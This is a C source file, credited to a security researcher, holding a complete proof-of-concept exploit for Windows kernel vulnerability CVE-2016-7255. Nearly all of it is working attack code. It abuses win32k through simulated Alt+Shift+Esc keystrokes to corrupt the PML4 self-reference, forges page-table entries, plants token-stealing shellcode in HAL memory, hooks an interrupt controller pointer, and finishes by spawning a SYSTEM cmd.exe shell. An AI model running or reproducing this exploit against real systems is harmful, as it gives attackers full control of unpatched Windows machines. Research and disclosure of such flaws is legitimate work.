// enrique.nissim@IOActive.com Copyright (C) 2016

//Copyright(C) 2016 Enrique Nissim

//This program is free software; you can redistribute it and/or
//modify it under the terms of the GNU General Public License
//as published by the Free Software Foundation.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program; if not, write to the Free Software
//Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.


// PoC from https://github.com/tinysec/public/tree/master/CVE-2016-7255

#include <windows.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdio.h>


#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"user32.lib")

UINT64 PML4_BASE;
UINT PML4_SELF_REF_INDEX;
UINT64 PML4_SELF_REF = 0xFFFFF6FB7DBEDF68;

UINT64 HalpInterruptController_address = 0xffffffffffd00670;
int HalpApicRequestInterruptOffset = 0x78;

#define GET_INDEX(va)  ( ((va >> 39) & 0x1ff )) 

char shellcode[] = {
	//0xcc,
	0xfa, // CLI
	0x9c, //PUSHFQ
	0x48, 0xb8, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  // MOV RAX, Original Pointer
	0x50, // PUSH RAX
	0x51, // PUSH RCX
	0x48, 0xb9, 0x90, 0x90, 0x90 ,0x90 ,0x90, 0x90, 0x90, 0x90,  // MOV RCX, [HalpInterruptController+HalpInterruptRequestOffset]
	0x48, 0x89, 0x01,  // mov    QWORD PTR [RCX], RAX
	0xb9, 0x90, 0x90, 0x90, 0x90,  // MOV ECX, PID
	0x53, // PUSH RBX

	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov    rax,QWORD PTR gs:0x188
	0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,				// mov    rax,QWORD PTR [rax+0xb8] EPROCESS
	0x48, 0x8d, 0x80, 0xf0, 0x02, 0x00, 0x00,				// lea    rax,[rax+0x2f0] // ActiveProcessLink
	//<tag>
	0x48, 0x8b, 0x00,									// mov    rax,QWORD PTR [rax]
	0x48, 0x8b, 0x58, 0xf8,								// mov    rbx,QWORD PTR [rax-0x8] // UniqueProcessID
	0x48, 0x83, 0xfb, 0x04,								// cmp    rbx,0x4
	0x75, 0xf3,											// jne    <tag>
	0x48, 0x8b, 0x58, 0x68,								// mov    rbx, QWORD PTR [rax+0x68] // GET TOKEN of SYSTEM

	0x53, // PUSH RBX
	//<tag2>
	0x48, 0x8b, 0x00,									// mov    rax,QWORD PTR [rax]
	0x48, 0x8b, 0x58, 0xf8,								// mov    rbx,QWORD PTR [rax-0x8] // UniqueProcessID
	0x39, 0xcb,											// cmp    ebx, ecx // our PID
	0x75, 0xf5,											// jne    <tag2>
	0x5b, // POP RBX
	0x48, 0x89, 0x58, 0x68,								// mov    QWORD PTR[rax + 0x68], rbx


	0x5b, // POP RBX
	0x59, // POP RCX
	0x58, // POP RAX
	0x9d, // POPFQ

	0xfb, // STI
	0xff, 0xe0 // JMP RAX
};

ULONG __cdecl DbgPrint(__in char* Format, ...)
{
	CHAR* pszDbgBuff = NULL;
	va_list VaList = NULL;
	ULONG ulRet = 0;

	do
	{
		pszDbgBuff = (CHAR*)HeapAlloc(GetProcessHeap(), 0, 1024 * sizeof(CHAR));
		if (NULL == pszDbgBuff)
		{
			break;
		}
		RtlZeroMemory(pszDbgBuff, 1024 * sizeof(CHAR));

		va_start(VaList, Format);

		_vsnprintf((CHAR*)pszDbgBuff, 1024 - 1, Format, VaList);


		OutputDebugStringA(pszDbgBuff);

		va_end(VaList);

	} while (FALSE);

	if (NULL != pszDbgBuff)
	{
		HeapFree(GetProcessHeap(), 0, pszDbgBuff);
		pszDbgBuff = NULL;
	}

	return ulRet;
}


int _sim_key_down(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = 0;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_key_up(WORD wKey)
{
	INPUT stInput = { 0 };

	do
	{
		stInput.type = INPUT_KEYBOARD;
		stInput.ki.wVk = wKey;
		stInput.ki.dwFlags = KEYEVENTF_KEYUP;

		SendInput(1, &stInput, sizeof(stInput));

	} while (FALSE);

	return 0;
}

int _sim_alt_shift_esc()
{
	int i = 0;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);


	} while (FALSE);

	return 0;
}



int _sim_alt_shift_tab(int nCount)
{
	int i = 0;
	HWND hWnd = NULL;


	int nFinalRet = -1;

	do
	{
		_sim_key_down(VK_MENU);
		_sim_key_down(VK_SHIFT);


		for (i = 0; i < nCount; i++)
		{
			_sim_key_down(VK_TAB);
			_sim_key_up(VK_TAB);

			Sleep(1000);

		}


		_sim_key_up(VK_MENU);
		_sim_key_up(VK_SHIFT);
	} while (FALSE);

	return nFinalRet;
}

int _sim_alt_esc(int count)
{
	int i = 0;

	for (i = 0; i<count; i++)
	{
		_sim_key_down(VK_MENU);
		//_sim_key_down(VK_SHIFT);


		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_down(VK_ESCAPE);
		_sim_key_up(VK_ESCAPE);

		_sim_key_up(VK_MENU);
		//_sim_key_up(VK_SHIFT);

	}

	return 0;
}


int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = { 0 };

	HWND    hWndParent = NULL;
	HWND    hWndChild = NULL;

	WCHAR*  pszClassName = L"cve-2016-7255";
	WCHAR*  pszTitleName = L"cve-2016-7255";

	void*   pId = NULL;
	MSG     stMsg = { 0 };

	UINT64 value = 0;

	do
	{

		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;

		if (0 == RegisterClassExW(&stWC))
		{
			break;
		}

		hWndParent = CreateWindowExW(
			0,
			pszClassName,
			NULL,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE,
			0,
			0,
			360,
			360,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD,
			0,
			0,
			160,
			160,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndChild)
		{
			break;
		}

#ifdef _WIN64
		pId = ((UCHAR*)pAddress - 0x28);
#else
		pId = ((UCHAR*)pAddress - 0x14);
#endif // #ifdef _WIN64

		SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)pId);

		DbgPrint("hWndChild = 0x%p\n", hWndChild);

		ShowWindow(hWndParent, SW_SHOWNORMAL);

		SetParent(hWndChild, GetDesktopWindow());

		SetForegroundWindow(hWndChild);

		_sim_alt_shift_tab(4);

		SwitchToThisWindow(hWndChild, TRUE);

		_sim_alt_shift_esc();

		while (GetMessage(&stMsg, NULL, 0, 0)) {
			
			SetFocus(hWndParent);
			_sim_alt_esc(20);
			SetFocus(hWndChild);
			_sim_alt_esc(20);

			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);
			
			if (value != 0) {
				break;
			}
			

			__try {
				value = *(UINT64 *)PML4_SELF_REF;
				if ((value & 0x67) == 0x67) {
					printf("Value Self Ref = %llx\n", value);
					break;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				continue;
			}

		}


	} while (FALSE);

	if (NULL != hWndParent)
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if (NULL != hWndChild)
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName, GetModuleHandleW(NULL));

	return 0;
}

void print_memory(unsigned long address, char *buffer, unsigned int bytes_to_print)
{
	unsigned int cont;
	unsigned int i;
	const unsigned short bytes = 16;

	/* Print the lines */
	for (cont = 0; cont < bytes_to_print; cont = cont + bytes)
	{
		printf("%p | ", (void *)address);
		address = address + bytes;

		for (i = 0; i < bytes; i++)
		{
			if (i < (bytes_to_print - cont))
			{
				printf("%.2x ", (unsigned char)buffer[i + cont]);
			}
			else
			{
				printf("   ");
			}
		}

		//Space between two columns
		printf("| ");

		//Print the characters
		for (i = 0; i < bytes; i++)
		{
			if (i < (bytes_to_print - cont))
			{
				printf("%c", (isgraph(buffer[i + cont])) ? buffer[i + cont] : '.');
			}
			else
			{
				printf(" ");
			}
		}
		printf("\n");
	}
}

UINT64 get_pxe_address(UINT64 address) {
	UINT entry = PML4_SELF_REF_INDEX;
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}

UINT64 look_free_entry_pml4(void) {
	// Looks for a free pml4e in the last 0x100 bytes of the PML4
	int offset = 0xF00;
	UINT64 pml4_search = PML4_BASE + offset;
	while (offset < 0xFF8)
	{
		if ((*(PVOID *)pml4_search) == 0x0)
		{
			// This is a NULL (free) entry
			break;
		}
		offset += 8;
		pml4_search = PML4_BASE + offset;
	}
	return pml4_search;
}

UINT64 calculate_spurious_pt_address(UINT64 spurious_offset) {
	UINT64 index = (spurious_offset & 0xFFF) / 8;
	UINT64 result = (
		((UINT64)0xFFFF << 48) |
		((UINT64)PML4_SELF_REF_INDEX << 39) |
		((UINT64)PML4_SELF_REF_INDEX << 30) |
		((UINT64)PML4_SELF_REF_INDEX << 21) |
		(index << 12)
		);
	return result;
}



UINT64 create_spurious_pte_to_virtual_address(UINT64 virtual_address, BOOL patch_original) {

	/*
	1: kd> !pte ffffffff`ffd00000
	VA ffffffffffd00000
	PXE at FFFFF6FB7DBEDFF8    PPE at FFFFF6FB7DBFFFF8    PDE at FFFFF6FB7FFFFFF0    PTE at FFFFF6FFFFFFE800
	contains 0000000000A1F063  contains 0000000000A20063  contains 0000000000A25063  contains 8000000000103963
	pfn a1f-- - DA--KWEV  pfn a20-- - DA--KWEV  pfn a25-- - DA--KWEV  pfn 103 - G - DA--KW - V
	*/


	UINT64 pte = get_pxe_address(virtual_address);
	int pte_offset = pte & 0xFFF;
	UINT64 pde = get_pxe_address(pte);
	int pde_offset = pde & 0xFFF;
	UINT64 pdpte = get_pxe_address(pde);
	int pdpte_offset = pdpte & 0xFFF;
	UINT64 pml4e = get_pxe_address(pdpte);
	int pml4e_offset = pml4e & 0xFFF;

	UINT64 spurious_offset = look_free_entry_pml4();
	printf("+] Selected spurious PML4E: %llx\n", spurious_offset);

	UINT64 spurious_pt = calculate_spurious_pt_address(spurious_offset);
	printf("+] Spurious PT: %llx\n", spurious_pt);

	//Read the physical address of pml4e	
	UINT64 pml4e_pfn = (UINT64)(*(PVOID *)pml4e);
	printf("+] Content pml4e %llx: %llx\n", pml4e, pml4e_pfn);
	// Change the PxE
	pml4e_pfn = pml4e_pfn | 0x67; // Set U/S
	printf("+] Patching the Spurious Offset with %llx\n", pml4e_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pml4e_pfn;
	Sleep(0x1); // Sleep for TLB refresh;

				//Read the physical address of pdpte
	UINT64 pdpte_pfn = (UINT64) *(PVOID *)(spurious_pt + pdpte_offset);
	printf("+] Content pdpte %llx: %llx\n", pdpte, pdpte_pfn);
	// Change the PxE
	pdpte_pfn = pdpte_pfn | 0x67; // Set U/S
	printf("+] Patching the Spurious Offset with %llx\n", pdpte_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pdpte_pfn;
	Sleep(0x1); // Sleep for TLB refresh;


				//Read the physical address of pde
	UINT64 pde_pfn = (UINT64) *(PVOID *)(spurious_pt + pde_offset);
	printf("+] Content pdpte %llx: %llx\n", pde, pde_pfn);
	// Change the PxE
	pde_pfn = pde_pfn | 0x67; // Set U/S
	printf("+] Patching the Spurious Offset with %llx\n", pde_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pde_pfn;
	Sleep(0x1); // Sleep for TLB refresh;


				//Read the physical address of pte
	UINT64 pte_pfn = (UINT64) *(PVOID *)(spurious_pt + pte_offset);
	printf("+] Content pte %llx: %llx\n", pte, pte_pfn);
	// Change the PxE
	pte_pfn = pte_pfn | 0x67; // Set U/S
	pte_pfn = pte_pfn & 0x7fffffffffffffff; // Turn off NX
	if (patch_original) {
		printf("*** Patching the original location to enable NX...\n");
		*(PVOID *)(spurious_pt + pte_offset) = (PVOID)pte_pfn;
	}
	printf("+] Patching the Spurious Offset with %llx\n", pte_pfn);
	*((PVOID *)spurious_offset) = (PVOID)pte_pfn;
	Sleep(0x1); // Sleep for TLB refresh;

	return spurious_pt;
}

UINT64 get_HalpApicInterruptController_pointer(void) {
	UINT64 HalpInterruptController = create_spurious_pte_to_virtual_address(HalpInterruptController_address, FALSE);
	HalpInterruptController += (HalpInterruptController_address & 0xFFF);
	return (UINT64) *((PVOID *)(((char *)HalpInterruptController) + HalpApicRequestInterruptOffset));
}

void overwrite_HalpApicInterruptController(UINT64 hook_address) {
	UINT64 HalpInterruptController = create_spurious_pte_to_virtual_address(HalpInterruptController_address, FALSE);
	HalpInterruptController += (HalpInterruptController_address & 0xFFF);
	UINT64 target = (UINT64)((char *)HalpInterruptController) + HalpApicRequestInterruptOffset;
	printf("Patch HalpInterruptController->HalpApicRequestInterrupt: %llx with %llx\n", target, hook_address);
	*(PVOID *)target = (PVOID)hook_address;
}


UINT64 store_shellcode_in_hal(void) {

	UINT64 original_pointer = get_HalpApicInterruptController_pointer();

	printf("Original HalpIntteruptRequest pointer: %llx\n", original_pointer);

	DWORD pid = GetCurrentProcessId();

	/* Shellcode Patching !! */
	char *p = shellcode;
	p += 4; // skip the CLI, PUSHF and MOV RAX bytes	
	*(PVOID *)p = (PVOID)original_pointer; // Patch shellcode1

	p += 12; // Patch shellcode with original HalpInterruptControllerOffset
	*(PVOID *)p = (PVOID)(HalpInterruptController_address + HalpApicRequestInterruptOffset);

	p += 12; // To patch the PID of our process
	*(DWORD *)p = (DWORD)pid;


	//// Finally store the shellcode on the HAL

	UINT64 hal_heap_addr = 0xFFFFFFFFFFD00000;
	UINT64 hal_heap = create_spurious_pte_to_virtual_address(hal_heap_addr, TRUE);

	printf("HAL address: %llx\n", hal_heap);
	// 0xffffffffffd00d50 this is a good offset to store shellcode 
	// 0xfff - 0xd50 = 0x2af space

	memcpy(((char *)hal_heap) + 0xd50, shellcode, sizeof(shellcode));
	//memcpy(((char *)hal_heap) + 0xd50, shellcode, sizeof(shellcode));

	return 0xffffffffffd00d50;
}


int __cdecl main(int argc, char** argv)
{
	TCHAR pre_username[256];
	TCHAR post_username[256];
	DWORD size = 256;

	printf("My PID is: %d\n", GetCurrentProcessId());
	GetUserName(pre_username, &size);
	printf("Current Username: %ls\n", pre_username);

	PML4_SELF_REF = _strtoui64(argv[1], NULL, 0x10);
	printf("PML4 Self Ref: %p\n", PML4_SELF_REF);

	printf("Enter to continue...\n");
	getchar();

	do
	{
		or_address_value_4((void*)PML4_SELF_REF);
	} while (FALSE);

	PML4_SELF_REF_INDEX = GET_INDEX((UINT64)PML4_SELF_REF);
	PML4_BASE = ((UINT64)PML4_SELF_REF & (UINT64)0xFFFFFFFFFFFFF000);
	print_memory(PML4_BASE, (char *)PML4_BASE, 0x1000);

	getchar();

	UINT64 shellcode_va = store_shellcode_in_hal();
	printf("+] w00t: Shellcode stored at: %llx\n", shellcode_va);
	overwrite_HalpApicInterruptController(shellcode_va);

	while (1) {
		size = 256;
		GetUserName(post_username, &size);
		if (memcmp(post_username, pre_username, 256) != 0) break;
	}
	Sleep(2000);
	system("cmd.exe");


	return 0;
}